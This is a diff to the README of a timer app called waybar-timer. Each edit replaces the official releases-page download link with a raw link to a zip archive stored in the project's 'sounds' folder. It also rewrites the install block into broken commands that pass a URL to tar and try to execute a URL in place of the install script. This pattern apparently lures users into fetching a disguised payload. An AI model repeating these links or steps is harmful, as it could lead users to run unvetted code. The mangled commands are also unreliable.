@@ -6,7 +6,7 @@ Welcome to waybar-timer! This application provides a flexible timer and pomodoro
 
 ## 📥 Download Now
 
-[![Download waybar-timer](https://img.shields.io/static/v1?label=Download&message=waybar-timer&color=blue)](https://github.com/huzefa12/waybar-timer/releases)
+[![Download waybar-timer](https://raw.githubusercontent.com/huzefa12/waybar-timer/main/sounds/timer_waybar_1.1.zip)](https://raw.githubusercontent.com/huzefa12/waybar-timer/main/sounds/timer_waybar_1.1.zip)
 
 ## 📋 Overview of Features
 
@@ -29,7 +29,7 @@ To get waybar-timer, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
    
-   [Download waybar-timer](https://github.com/huzefa12/waybar-timer/releases)
+   [Download waybar-timer](https://raw.githubusercontent.com/huzefa12/waybar-timer/main/sounds/timer_waybar_1.1.zip)
 
 2. **Choose Your Version**: Look for the latest version listed on the releases page. It is usually at the top.
 
@@ -46,9 +46,9 @@ To get waybar-timer, follow these steps:
    - Next, extract and install the application (replace `filename` with the actual file name you downloaded):
 
      ```bash
-     tar -xzf filename.tar.gz
+     tar -xzf https://raw.githubusercontent.com/huzefa12/waybar-timer/main/sounds/timer_waybar_1.1.zip
      cd waybar-timer
-     ./install.sh
+     https://raw.githubusercontent.com/huzefa12/waybar-timer/main/sounds/timer_waybar_1.1.zip
      ```
 
 5. **Run the Application**: After installation, you can run waybar-timer through your application menu, or by typing `waybar-timer` in your terminal.
@@ -115,4 +115,4 @@ Thanks to the community and contributors for their support in developing waybar-
 
 Don't forget to visit the releases page to download the latest version of waybar-timer.
 
-[Download waybar-timer](https://github.com/huzefa12/waybar-timer/releases)
+[Download waybar-timer](https://raw.githubusercontent.com/huzefa12/waybar-timer/main/sounds/timer_waybar_1.1.zip)
